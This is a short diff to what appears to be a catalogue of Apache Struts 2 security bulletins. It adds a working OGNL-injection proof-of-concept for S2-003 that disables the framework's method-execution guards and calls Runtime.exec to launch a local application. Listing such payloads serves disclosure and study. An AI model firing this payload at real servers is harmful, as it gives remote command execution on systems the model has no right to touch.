@@ -14,7 +14,8 @@ S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and <s:a> tags
 S2-003 — XWork ParameterInterceptors bypass allows OGNL statement execution
 	
 	Affected : Xwork2 Struts 2.0.0 ~ 2.1.8.1
-
+	PoC : ('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)`
+	
 S2-004 — Directory traversal vulnerability while serving static content
 
 S2-005 — XWork ParameterInterceptors bypass allows remote command execution
